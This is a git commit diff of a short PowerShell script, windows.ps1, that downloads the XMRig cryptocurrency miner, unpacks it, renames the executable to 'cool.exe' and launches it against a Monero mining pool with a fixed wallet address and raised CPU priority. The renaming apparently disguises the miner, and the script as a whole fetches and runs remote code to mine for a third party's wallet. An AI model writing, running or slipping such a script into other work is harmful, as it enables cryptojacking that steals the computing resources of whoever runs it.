4e689a6ade111c0f5fa5f5005d493ab647e1ff6a
Lachine <86872452+Lachine1@users.noreply.github.com>
2024-05-24 18:55:30 +0200

    Update and rename windows.bat to windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,5 +1,5 @@
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
-unzip xmrig.zip
+Expand-Archive xmrig.zip
 cd xmrig.zip
-move xmrig.exe cool.exe
+Move-Item –Path xmrig.exe -Destination cool.exe
 .\cool.exe -o xmrpool.eu:3333 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
